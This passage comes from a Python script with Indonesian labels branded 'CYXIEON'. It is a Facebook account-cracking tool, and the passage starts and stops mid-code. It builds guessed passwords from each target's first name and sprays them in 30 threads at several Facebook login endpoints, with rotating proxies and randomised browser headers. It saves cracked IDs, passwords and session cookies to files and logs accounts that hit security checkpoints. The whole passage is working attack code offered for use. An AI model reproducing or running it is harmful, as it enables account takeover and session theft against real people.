		exit(f"{kun}└──[{mer} File tidak di temukan ")
	if len(vin)==0:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} Tidak mempuyai file OK ")
	else:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('CYXIEON-OK/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		geeh = input(f'{kun}└──[{puti} Input file : ')
		try:geh = lol[geeh]
		except KeyError:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} Pilih yang bener :-( ")
		try:lin = open('CYXIEON-OK/'+geh,'r').read().splitlines()
		except:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} File tidak di temukan ")
		nocp=0
		for cpku in range(len(lin)):
			cpkuni=lin[nocp].split('|')
			tree = Tree("")
			tree.add(f"{hijo}{cpkuni[0]}{puti}").add(f"{hijo}{cpkuni[1]}{puti}")
			tree.add(f"{hijo}{cpkuni[2]}{puti}")
			prints(tree)
			nocp +=1
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		input(f'{kun}└──[{mer} Klik Enter {kun}]')
		menu()

#----------[ HASIL-CP]----------#            
def hasil_cp():
	try:vin = os.listdir('CYXIEON-CP')
	except FileNotFoundError:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} File tidak di temukan ")
	if len(vin)==0:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} Tidak mempuyai file OK ")
	else:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('CYXIEON-CP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		geeh = input(f'{kun}└──[{puti} Input file : ')
		try:geh = lol[geeh]
		except KeyError:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} Pilih yang bener :-( ")
		try:lin = open('CYXIEON-CP/'+geh,'r').read().splitlines()
		except:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} File tidak di temukan ")
		nocp=0
		for cpku in range(len(lin)):
			cpkuni=lin[nocp].split('|')
			tree = Tree("")
			tree.add(f"{kun}{cpkuni[0]}{puti}").add(f"{kun}{cpkuni[1]}{puti}")
			prints(tree)
			nocp +=1
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		input(f'{kun}└──[{mer} Klik Enter {kun}]')
		menu()
																		
#----------[ MENU-IDZ ]----------#		
def atur_id():
     rr = random.randint
     for khusus_random in id:
            cyxieon_id = rr(0,len(id2))
            id2.insert(cyxieon_id, khusus_random)
     atur_method()
     
#----------[ MENU-METODE ]----------#
def atur_method():
	print("")
	print(f"\n{biru}╭────────────────────────────────────────────{puti}")
	print(f'{biru}└──[{puti} {mer}01.{puti} m.prod.facebook.com v1 ')
	print(f'{biru}└──[{puti} {mer}02.{puti} m.facebook.com v1 ')
	print(f'{biru}└──[{puti} {mer}03.{puti} mbasic.facebook.com v1 ')      
	print(f'{biru}└──[{puti} {mer}04.{puti} m.facebook.com v2 ')
	print(f'{biru}└──[{puti} {mer}05.{puti} mbasic.facebook.com v2 ')
	print(f'{biru}└──[{puti} {mer}06.{puti} m.facebook.com v3 ')
	print(f'{biru}└──[{puti} {mer}07.{puti} free.prod.facebook.com v1')
	print(f'{biru}└──[{puti} {mer}08.{puti} m.facebook.com v4 ')
	print(f'{biru}└──[{puti} {mer}09.{puti} b-api.facebook.com v1 ')
	print(f'{biru}└──[{puti} {mer}10.{puti} messenger.com v1 ')
	print(f"{biru}╭────────────────────────────────────────────{puti}") 
	CYXIEON_METHODE = input(f'{biru}└──[{puti} Input method : ')
	if CYXIEON_METHODE in ['1','01']:
	   method.append('validate')  
	elif CYXIEON_METHODE in ['2','02']:
	   method.append('reguler')       
	elif CYXIEON_METHODE in ['3','03']:
	   method.append('asyinc')
	elif CYXIEON_METHODE in ['4','04']:
	   method.append('rr071')       
	elif CYXIEON_METHODE in ['5','05']:
	   method.append('rr072')
	elif CYXIEON_METHODE in ['6','06']:
	   method.append('rr073')       
	elif CYXIEON_METHODE in ['7','07']:
	   method.append('rr074')
	elif CYXIEON_METHODE in ['8','08']:
	   method.append('rr075')       
	elif CYXIEON_METHODE in ['9','09']:
	   method.append('rr076')
	elif CYXIEON_METHODE in ['10']:
	   method.append('rr077')       
	else:
		method.append('validate')
	print(f"{biru}╭────────────────────────────────────────────{puti}")
	print(f'{biru}└──[{puti} Tambahkan pw manual (y/t) ')
	print(f"{biru}╭────────────────────────────────────────────{puti}") 	
	passwtamb = input(f'{biru}└──[{puti} Input : ')
	if passwtamb in ['y','Y']:
		     sandine.append('ya')
		     print(f"{biru}╭────────────────────────────────────────────{puti}")
		     sandiku = input(f'{biru}└──[{puti} Input Pw : ')
		     sandimu = sandiku.split(',')
		     for sandixnxx in sandimu:
		         sandina.append(sandixnxx)		 
	else:
	    sandine.append('no')
	passwordlist()
	
#----------[ BAGIAN-WORDLIST ]----------#	
def passwordlist():
	global prog,des
	print(f"{biru}╭────────────────────────────────────────────{puti}")
	print(f'{biru}└──[{puti} PROSES CRACK SEDANG BERLANGSUNG')
	print(f"{biru}─────────────────────────────────────────────{puti}")
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pemuda_tersakiti:
			for _gabutz_ster_ in id2:
				idf,namamu_ku_simpan = _gabutz_ster_.split('|')[0],_gabutz_ster_.split('|')[1].lower()
				frestile = namamu_ku_simpan.split(" ")[0]
				pwx = []
				if len(namamu_ku_simpan)<6:
					if len(frestile)<3:
						pass
					else:
						pwx.append(frestile+'123')
						pwx.append(frestile+'1234')
						pwx.append(frestile+'12345')
						pwx.append(frestile+'123456789')
						pwx.append(frestile+'321')
						pwx.append(frestile+'01')
						pwx.append(frestile+'02')
						pwx.append(frestile+'03')
						pwx.append(frestile+'04')
						pwx.append(frestile+'05')
						pwx.append(frestile+'06')
						pwx.append(frestile+'07')
						pwx.append(frestile+'08')
						pwx.append(frestile+'09')
						
				else:
					if len(frestile)<3:
						pwx.append(namamu_ku_simpan)
					else:
						pwx.append(namamu_ku_simpan)
						pwx.append(frestile+'123')
						pwx.append(frestile+'1234')
						pwx.append(frestile+'12345')
						pwx.append(frestile+'321')
						pwx.append(frestile+'01')
						pwx.append(frestile+'02')
						pwx.append(frestile+'03')
						pwx.append(frestile+'04')
						pwx.append(frestile+'05')
						pwx.append(frestile+'06')
						pwx.append(frestile+'07')
						pwx.append(frestile+'08')
						pwx.append(frestile+'09')
						
				if 'ya' in sandine: 
					for sandi_kita in sandina:
						pwx.append(sandi_kita)
				else:pass
				if 'validate' in method:
				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'m.prod.facebook.com')
				elif 'reguler' in method:
				    pemuda_tersakiti.submit(crackreguler,idf,pwx,'m.facebook.com')
				elif 'asyinc' in method:
				    pemuda_tersakiti.submit(crackasyinc,idf,pwx,'m.alpha.facebook.com')
				elif 'rr071' in method:
				    pemuda_tersakiti.submit(rr071,idf,pwx,'m.alpha.facebook.com')
				elif 'rr072' in method:
				    pemuda_tersakiti.submit(rr072,idf,pwx,'m.alpha.facebook.com')
				elif 'rr073' in method:
				    pemuda_tersakiti.submit(rr073,idf,pwx,'m.alpha.facebook.com')
				elif 'rr074' in method:
				    pemuda_tersakiti.submit(rr074,uid,pwx,'m.alpha.facebook.com')
				elif 'rr075' in method:
				    pemuda_tersakiti.submit(rr075,uid,pwx,'m.alpha.facebook.com')
				elif 'rr076' in method:
				    pemuda_tersakiti.submit(rr076,uid,pwx,'m.alpha.facebook.com')
				elif 'rr077' in method:
				    pemuda_tersakiti.submit(rr077,uid,pwx,'m.alpha.facebook.com')
				else:
				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'m.facebook.com')
				    
	print(f"{biru}╭────────────────────────────────────────────{puti}")
	print(f'{biru}└──[{puti} OK {hijo}: %s'%(ok))
	print(f'{biru}└──[{puti} CP {kun}: %s'%(cp))
	print(f"{biru}─────────────────────────────────────────────{puti}")
	
#----------[ METODE-VALIDATE ]----------#	
def crackvalidate(idf,pwx,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	emot = rc(["🥸",])
	prog.update(des,description=f"\r {emot}(Validate)(%sOK:{ok}%s)(%sCP:{cp}%s)(%s {loop}%s)"%(hijo,puti,kun,puti,hijo,puti))
	prog.advance(des)
	for pw in pwx:
		try:
			ua = rc(ugen)
			#ua2 = ("Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59")
			link = ses.get("https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = (
			{
			"lsd":
			      re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
			"jazoest":
			      re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
	        "uid":idf,
	        "next": "https://x.facebook.com/v3.1/dialog/oauth?client_id=3213804762189845&redirect_uri=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success&scope=email&state=0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%253D&ret=login&fbapp_pres=0&logger_id=af919600-a681-4aeb-a128-05e90339859f&tp=unspecified",
	        "flow":"login_no_pin",
	        "pass":pw,
	        } 
	    )    
			cuoz = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])		
			head=(
		{
		'Host': url,
		'cache-control': 'max-age=0',
		'upgrade-insecure-requests': '1',
		'origin': f'https://'+url,
	     'content-type': 'application/x-www-form-urlencoded',
	     'x-requested-with': 'XMLHttpRequest',
		'user-agent': ua,
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'sec-fetch-site': 'same-origin',
	     'sec-fetch-mode': 'navigate',
	     'sec-fetch-user': '?1',
	     'sec-fetch-dest': 'document',
		'dpr': f'{str(rr(1,5))}',
		'viewport-width': f'{str(rr(300,999))}',
	     'sec-ch-ua': f'"Not)A;Brand";v="{str(rr(8,24))}", "Chromium";v="{str(rr(99,116))}"',
	     'sec-ch-ua-mobile': '?1',
	     'sec-ch-ua-platform': '"Android"',
	     'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
	     'sec-ch-ua-full-version-list': f'"Not)A;Brand";v="{str(rr(8,24))}.0.0.0", "Chromium";v="{str(rr(99,120))}.0.{str(rr(5000,5999))}.{str(rr(40,150))}"',
	     'sec-ch-prefers-color-scheme': 'dark',
	     'referer': f'https://{url}/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
	     'accept-encoding': 'gzip, deflate, br',
	     'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
	     }
	 )
			po = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID", headers=head, data=date, cookies={'cookie': cuoz}, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				print(f"\n⌲ User ID: {hijo}{idf}{puti}")
				print(f"⌲ Password: {hijo}{pw}{puti}")
				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
				print(f"⌲ Cookie: {hijo}{kuki}{puti}")
				print(f'{hijo}{ua}')
				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f"\n⌲ User ID: {kun}{idf}{puti}")
				print(f"⌲ Password: {kun}{pw}{puti}")
				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
				print(f'{kun}{ua}')
				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#----------[ METODE-REGULER ]----------#	
def crackreguler(idf,pwx,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	emot = rc(["😝","😜","🤪"])
	prog.update(des,description=f"\r {emot} ( REGULER ) (%s OK : {ok} %s) (%s CP : {cp} %s) (%s {loop} %s) "%(hijo,puti,kun,puti,hijo,puti))
	prog.advance(des)
	for pw in pwx:
		try:
			proxs = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt').text
			open('socks4.txt','w').write(proxs)
			nip = rc(proxs)
			proxs = {'http': 'socks5://'+nip}
			ua = rc(ugen)
			ses.headers.update(
			{
			"Host":url,
			"upgrade-insecure-requests":"1",
			"user-agent":ua,
			"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"dnt":f"{str(rr(1,9))}",
			"x-requested-with":"mark.via.gp",
			"sec-fetch-site":"same-origin",
			"sec-fetch-mode":"cors",
			"sec-fetch-user":"empty",
			"sec-fetch-dest":"document",
			"referer":f"https://{url}/",
			"accept-encoding":"gzip, deflate br",
			"accept-language":"en-US;q=0.8,en;q=0.7"
			}
		)
			link = ses.get('https://m.facebook.com/login/?email='+idf).text
			date = ({'lsd':re.search('name="lsd" value="(.*?)"', str(link)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(link)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
'li':re.search('name="li" value="(.*?)"', str(link)).group(1),'email':idf,'pass':pw})
			ses.headers.update(
			{
			'Host': url,
			'cache-control': 'max-age=0',
			'upgrade-insecure-requests': '1',
			'origin': 'https://'+url,
			'content-type': 'application/x-www-form-urlencoded',
			'user-agent': ua,
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-mode': 'cors',
			'sec-fetch-user': 'empty',
			'sec-fetch-dest': 'document',
			'referer': f'https://{url}/login/?email='+idf,
			'accept-encoding':'gzip, deflate br',
			'accept-language': 'en-US;q=0.8,en;q=0.7'
			}
		)
			po = ses.post(f"https://{url}/login/login/device-based/regular/login/?shbl=1&refsrc=deprecated", data=date,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				print(f"\n⌲ User ID: {hijo}{idf}{puti}")
				print(f"⌲ Password: {hijo}{pw}{puti}")
				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
				print(f"⌲ Cookie: {hijo}{kuki}{puti}")
				print(f'{hijo}{ua}')
				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f"\n⌲ User ID: {kun}{idf}{puti}")
				print(f"⌲ Password: {kun}{pw}{puti}")
				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
				print(f'{kun}{ua}')
				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#----------[ METODE-ASYINC ]----------#	
def crackasyinc(idf,pwx):
  global loop,ok,cp
  ses = requests.Session()
  rr = random.randint
  rc = random.choice
  emot = rc(["😝","😜","🤪"])
  prog.update(des,description=f"\r {emot} ( ASYINC ) (%s OK : {ok} %s) (%s CP : {cp} %s) (%s {loop} %s) "%(hijo,puti,kun,puti,hijo,puti))
  prog.advance(des)
  for pw in pwx:
    try:
      proxs = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt').text
      open('http.txt','w').write(proxs)
      nip = rc(proxs)
      proxs = {'http': 'socks4://'+nip}
      ua = rc(ugen)
      ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
      link = ses.get('https://mbasic.facebook.com/login/?email='+idf+'&app_id=469724967619195&api_key=469724967619195&auth_token=e30a80f9070ee8fc49a23998b8eb9b54&next=https%3A%2F%2Fmbasic.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fapp_id%3D469724967619195%26cbt%3D1697161758144%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2c5574a5c040a8%2526domain%253Dpage.palm.tech%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpage.palm.tech%25252Ff2751a06ed883e4%2526relation%253Dopener%26client_id%3D469724967619195%26display%3Dtouch%26domain%3Dpage.palm.tech%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpage.palm.tech%252Fpalm-id%252F%2523%252Flogin%253Fclient-id%253Ditel-global%2526callbackUrl%253Dhttp%25253A%25252F%25252Fclub.itel-life.com%25252F%2526language%253Den_US%2526brandId%253Ditel%26locale%3Den_US%26logger_id%3Df34548c36d16038%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df18f150b67c9dac%2526domain%253Dpage.palm.tech%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpage.palm.tech%25252Ff2751a06ed883e4%2526relation%253Dopener%2526frame%253Df18a7b805567f3c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cuser_likes%26sdk%3Djoey%26version%3Dv3.2%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&li=VKIoZfrCsErYtA-k75tkXpQ4&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df18f150b67c9dac%26domain%3Dpage.palm.tech%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpage.palm.tech%252Ff2751a06ed883e4%26relation%3Dopener%26frame%3Df18a7b805567f3c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&e=1348092&skip_api_login=1&shbl=1&locale2=id_ID&refsrc=deprecated&_rdr')
      date = {
      'jazoest': re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
      'lsd': re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
      'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
      'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
      'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
      'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
      'email': idf,
      'pass': pw,
      'login': 'Masuk',
      'bi_xrwh': '0',
        } 
      head = {
        'authority': 'mbasic.facebook.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'datr=oDsmZQf-E4oWEVXe2mL60sel; sb=oDsmZa2tlKPnKBwHNeLOYPDU; m_pixel_ratio=2; wd=360x680; fr=0DHam0bHkeqAY8Rbd..BlJjug.YT.AAA.0.0.BlKKIg.AWUho9WHBbs',
        'dpr': '2',
        'origin': 'https://mbasic.facebook.com',
        'referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=469724967619195&kid_directed_site=0&app_id=469724967619195&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fapp_id%3D469724967619195%26cbt%3D1697161758144%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2c5574a5c040a8%2526domain%253Dpage.palm.tech%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpage.palm.tech%25252Ff2751a06ed883e4%2526relation%253Dopener%26client_id%3D469724967619195%26display%3Dtouch%26domain%3Dpage.palm.tech%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpage.palm.tech%252Fpalm-id%252F%2523%252Flogin%253Fclient-id%253Ditel-global%2526callbackUrl%253Dhttp%25253A%25252F%25252Fclub.itel-life.com%25252F%2526language%253Den_US%2526brandId%253Ditel%26locale%3Den_US%26logger_id%3Df34548c36d16038%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df18f150b67c9dac%2526domain%253Dpage.palm.tech%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpage.palm.tech%25252Ff2751a06ed883e4%2526relation%253Dopener%2526frame%253Df18a7b805567f3c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cuser_likes%26sdk%3Djoey%26version%3Dv3.2%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df18f150b67c9dac%26domain%3Dpage.palm.tech%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpage.palm.tech%252Ff2751a06ed883e4%26relation%3Dopener%26frame%3Df18a7b805567f3c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
        'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5792.214", "Google Chrome";v="114.0.5792.214"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '""',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': ua,
        'viewport-width': '980',
